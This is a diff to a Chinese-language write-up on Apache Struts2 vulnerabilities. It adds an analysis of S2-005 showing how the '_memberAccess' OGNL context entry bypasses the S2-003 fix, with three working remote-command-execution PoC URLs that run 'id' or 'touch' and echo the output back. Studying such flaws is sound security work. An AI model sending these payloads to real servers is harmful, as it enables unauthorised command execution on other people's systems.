@@ -129,11 +129,11 @@ https://cwiki.apache.org/confluence/display/WW/S2-003
 
 ## 漏洞复现与分析
 
-如公告所述，该漏洞存在于Struts2默认的一个拦截器`ParametersInterceptor`。该过滤器在处理请求参数时，为了防止外界输入通过OGNL表达式来操作OGNL上下文对象`context`，对字符`#`进行了安全过滤。但由于OGNL可以识别unicode编码，故可将字符`#`进行unicode编码(即`\u0023`)后进行绕过，
+如公告所述，该漏洞存在于Struts2默认的一个拦截器`ParametersInterceptor`。该过滤器在处理请求参数时，为了防止外界输入通过OGNL表达式来操作OGNL上下文对象`context`，对字符`#`进行了安全过滤。但由于OGNL可以识别unicode编码，故可将字符`#`进行unicode编码(即`\u0023`)后进行绕过。
 
 下面来实际调试一下。
 
-漏洞复现环境依旧使用`medicean/vulapps:s_struts2_s2-001`。
+漏洞复现环境依旧使用`struts-2.0.11.2/apps/struts2-blank-2.0.11.2.war`。
 
 客户端发送请求后，在`ParametersInterceptor#doIntercept()`方法里断下，然后会先调用`OgnlContextState.setDenyMethodExecution(contextMap, true)`方法来设置不允许OGNL表达式调用方法。然后调用`ParametersInterceptor#setParameters()`方法对请求参数进行处理。如下图：
 
@@ -239,7 +239,7 @@ Struts2 `2.0.12`版本，依赖的XWork版本是`2.0.6`。通过比对XWork`2.0.
 
 很明显，需要`isAccepted()`返回`true`并且`isExcluded(name)`返回`false`才行。
 
-而`isAccepted()`和`isExcluded()`的返回值取决于`SecurityMemberAccess`的两个属性：`acceptProperties`和`excludeProperties`。这两个属性的赋值前面提到，是在`ParametersInterceptor#setParameters()`方法中，其对应的值是`ParametersInterceptor`的两个属性`acceptParams`和`excludeParams`。通过阅读代码可知，`acceptParams`是一个空的集合，而`excludeParams`这个集合由于interceptord的配置文件中`ParametersInterceptor`的配置了该属性的初始值所以并不是空集合。其实这两个属性的值也可以通过调试可知。
+而`isAccepted()`和`isExcluded()`的返回值取决于`SecurityMemberAccess`的两个属性：`acceptProperties`和`excludeProperties`。这两个属性的赋值前面提到，是在`ParametersInterceptor#setParameters()`方法中，其对应的值是`ParametersInterceptor`的两个属性`acceptParams`和`excludeParams`。通过阅读代码可知，`acceptParams`是一个空的集合，而`excludeParams`这个集合由于interceptor的配置文件中`ParametersInterceptor`的配置了该属性的初始值所以并不是空集合。其实这两个属性的值也可以通过调试可知。
 
 <img src="pic/struts2_s2-003_12.png">
 
@@ -250,15 +250,94 @@ Struts2 `2.0.12`版本，依赖的XWork版本是`2.0.6`。通过比对XWork`2.0.
 <a name="s2-005"></a>
 ## S2-005
 
+官方漏洞公告：<br>
+https://cwiki.apache.org/confluence/display/WW/S2-005
+
+影响版本：`Struts 2.0.0 - Struts 2.1.8.1`
+
 ## 漏洞复现与分析
 
+漏洞环境：`Struts2-2.0.12/apps/struts2-blank-2.0.12.war`
 
+从前面对S2-003的漏洞修复部分可以知道，只要想办法让`SecurityMemberAccess#isExcluded()`方法返回`false`，就能让我们注入的OGNL表达式中的Java方法执行。而要`SecurityMemberAccess#isExcluded()`方法返回`false`，就得让`SecurityMemberAccess`的`excludeProperties`这个集合置空才行。
+
+通过查看源码，发现`SecurityMemberAccess`对象是在`OgnlValueStack`对象被创建时，存放到其`context`属性(即该值栈的上下文对象,`OgnlContext`)中的。
+
+<img src="pic/struts2_s2-005_1.png">
+
+<img src="pic/struts2_s2-005_2.png">
+
+所以是不是可以通过OGNL表达式`#context['memberAccess']`就能访问`SecurityMemberAccess`对象了呢？
+
+**答案是否定的**。
+
+通过阅读`OgnlContext`的源码发现，`OgnlContext`虽然自身实现了`Map`集合接口，并重写了`Map#put()`和`Map#get()`方法。但并没有把`SecurityMemberAccess`对象`put()`到内部`Map`集合中，而是赋值给自己的成员变量`memberAccess`中。实际上，`OgnlContext`是使用了装饰模式去扩展`Map`接口的。其内部有两个`Map`类型的成员变量：`RESERVED_KEYS`和`values`来进行实际的`Map`容器存取操作。因此我们不能通过OGNL表达式`#context['memberAccess']`来访问`SecurityMemberAccess`对象。
+
+<img src="pic/struts2_s2-005_3.png">
+
+但是从`OgnlContext`重写`Map`的`get()`方法中，我们看到了有意思的事，就是如果当`RESERVED_KEYS`集合包含名为`_memberAccess`的key时，会返回`SecurityMemberAccess`对象。而`RESERVED_KEYS`集合中确实是包含这个key的。所以我们就可以通过OGNL表达式`#context['_memberAccess']`或`#_memberAccess`去访问到`SecurityMemberAccess`对象。
+
+<img src="pic/struts2_s2-005_4.png">
+
+<img src="pic/struts2_s2-005_5.png">
+
+因此简单执行命令的PoC如下：
+```
+/xxx.action?
+(a)(%5cu0023_memberAccess.excludeProperties%5cu003d@java.util.Collections@EMPTY_SET)
+&(b)(%5cu0023context['xwork.MethodAccessor.denyMethodExecution']%5cu003dfalse)
+&(c)(%5cu0023ret%5cu003d@java.lang.Runtime@getRuntime().exec('touch%5cu0020/tmp/success2'))
+```
 
 ### 可回显PoC
+与前面漏洞不同的是，本次漏洞的回显PoC无法向之前的方式去获取`com.opensymphony.xwork2.dispatcher.HttpServletResponse`对象来实现。经调试发现，因为当前`context`对象是在一个新的`OgnlValueStack`值栈对象(即`newStack`)里的，其中并没有这个键值，如下图：
 
+<img src="pic/struts2_s2-005_6.png">
 
+因为这个里的`newStack`是由原来的`stack`新建的，阅读`OgnlValueStack(ValueStack)`构造方法的实现可知，新建的`newStack`并不会拷贝`stack`的`context`上下文对象的键值对。所以这里换一种方式，使用静态方法`ServletActionContext#getResponse()`去获取`HttpServletResponse`对象，实际上它获取的就是原来的`stack`值栈结构中的`context`上下文对象里的`com.opensymphony.xwork2.dispatcher.HttpServletResponse`。
+
+因此构造可回显PoC如下：
+
+```
+/xxx.action?
+(a)(%5cu0023_memberAccess.excludeProperties%5cu003d@java.util.Collections@EMPTY_SET)
+&(b)(%5cu0023context['xwork.MethodAccessor.denyMethodExecution']%5cu003dfalse)
+&(c)(%5cu0023ret%5cu003d@java.lang.Runtime@getRuntime().exec('id'))
+&(d)(%5cu0023dis%5cu003dnew%5cu0020java.io.BufferedReader(new%5cu0020java.io.InputStreamReader(%5cu0023ret.getInputStream())))
+&(e)(%5cu0023res%5cu003dnew%5cu0020char[20000])
+&(f)(%5cu0023dis.read(%5cu0023res))
+&(g)(%5cu0023writer%5cu003d@org.apache.struts2.ServletActionContext@getResponse().getWriter())
+&(h)(%5cu0023writer.println(new%5cu0020java.lang.String(%5cu0023res)))
+&(i)(%5cu0023writer.flush())
+&(j)(%5cu0023writer.close())
+```
+
+<img src="pic/struts2_s2-005_7.png">
+
+后来用Struts2 `2.1.8.1`版本也调了下，发现代码有细微差别。上面的PoC无效。不过实现思路是一样的，改一下即可：
+
+```
+/xxx.action?
+(a)(%5cu0023_memberAccess.allowStaticMethodAccess%5cu003dtrue)
+&(b)(%5cu0023context['xwork.MethodAccessor.denyMethodExecution']%5cu003dfalse)
+&(c)(%5cu0023ret%5cu003d@java.lang.Runtime@getRuntime().exec('id'))
+&(d)(%5cu0023dis%5cu003dnew%5cu0020java.io.BufferedReader(new%5cu0020java.io.InputStreamReader(%5cu0023ret.getInputStream())))
+&(e)(%5cu0023res%5cu003dnew%5cu0020char[20000])
+&(f)(%5cu0023dis.read(%5cu0023res))
+&(g)(%5cu0023writer%5cu003d@org.apache.struts2.ServletActionContext@getResponse().getWriter())
+&(h)(%5cu0023writer.println(new%5cu0020java.lang.String(%5cu0023res)))
+&(i)(%5cu0023writer.flush())
+&(j)(%5cu0023writer.close())
+```
+
+<img src="pic/struts2_s2-005_8.png">
 
 ## 漏洞修复
+
+在Struts `2.2.1`版本中，使用了正则表达式匹配白名单字符的方式去校验请求url的参数：
+
+<img src="pic/struts2_s2-005_9.png">
+
 
 <a name="s2-007"></a>
 ## S2-007
